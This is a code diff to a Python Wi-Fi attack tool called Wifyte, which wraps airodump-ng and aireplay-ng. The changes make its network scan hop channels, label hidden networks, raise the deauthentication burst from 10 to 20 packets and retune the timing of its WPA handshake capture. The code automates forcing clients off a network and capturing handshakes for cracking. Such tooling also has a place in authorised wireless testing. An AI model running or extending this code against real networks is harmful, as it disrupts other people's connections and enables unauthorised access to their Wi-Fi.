@@ -197,7 +197,7 @@ class Wifyte:
         # File for scan results
         output_file = os.path.join(self.temp_dir, "scan-01.csv")
 
-        # Start airodump-ng
+        # Start airodump-ng with channel hopping
         proc = subprocess.Popen(
             [
                 "airodump-ng",
@@ -205,25 +205,31 @@ class Wifyte:
                 os.path.join(self.temp_dir, "scan"),
                 "--output-format",
                 "csv",
+                "--channel",  # Use all channels
+                "1,2,3,4,5,6,7,8,9,10,11,12,13",
                 self.monitor_interface,
             ],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         )
 
+        networks = []
+        max_scanning_time = 8  # Default maximum scanning time
+
         try:
-            # Scan for 8 seconds
-            for i in range(8):
+            # Scan for 8 seconds with countdown
+            for i in range(max_scanning_time):
                 time.sleep(1)
-                print(f"{Colors.BLUE}[*] Scanning... {i+1}/8{Colors.ENDC}", end="\r")
-            print("\n")
+                print(
+                    f"{Colors.BLUE}[*] Scanning... {i+1}/{max_scanning_time}{Colors.ENDC}",
+                    end="\r",
+                )
+            print("\n")  # Move to next line after countdown
         except KeyboardInterrupt:
             colored_log("warning", "Scanning stopped by user")
         finally:
             proc.send_signal(signal.SIGTERM)
             proc.wait()
-
-        networks = []
 
         # Parse CSV results
         if os.path.exists(output_file):
@@ -245,6 +251,9 @@ class Wifyte:
                         if len(parts) >= 14 and parts[13].strip():
                             network_id += 1
                             try:
+                                essid = parts[13].strip().replace("\x00", "")
+                                if not essid:  # Handle hidden SSID
+                                    essid = "<Hidden Network>"
                                 networks.append(
                                     WiFiNetwork(
                                         id=network_id,
@@ -258,7 +267,7 @@ class Wifyte:
                                             else 0
                                         ),
                                         encryption=f"{parts[5]} {parts[6]}".strip(),
-                                        essid=parts[13].strip().replace("\x00", ""),
+                                        essid=essid,
                                     )
                                 )
                             except (ValueError, IndexError):
@@ -349,7 +358,7 @@ class Wifyte:
             deauth_cmd = [
                 "aireplay-ng",
                 "--deauth",
-                "10",
+                "20",
                 "-a",
                 network.bssid,
                 "-c",
@@ -359,7 +368,7 @@ class Wifyte:
             subprocess.Popen(
                 deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
-            time.sleep(0.8)  # Wait between deauth attempts
+            time.sleep(1)  # Wait between deauth attempts
 
         colored_log("success", "Deauthentication completed for all connected clients.")
 
@@ -462,7 +471,7 @@ class Wifyte:
                 self.handshake_found = True
                 self.stop_capture = True
                 break
-            time.sleep(0.5)  # Check every 0.5 seconds
+            time.sleep(1)  # Check every 1 seconds
 
     def _check_handshake(self, cap_file: str) -> bool:
         """Check if capture file contains handshake"""
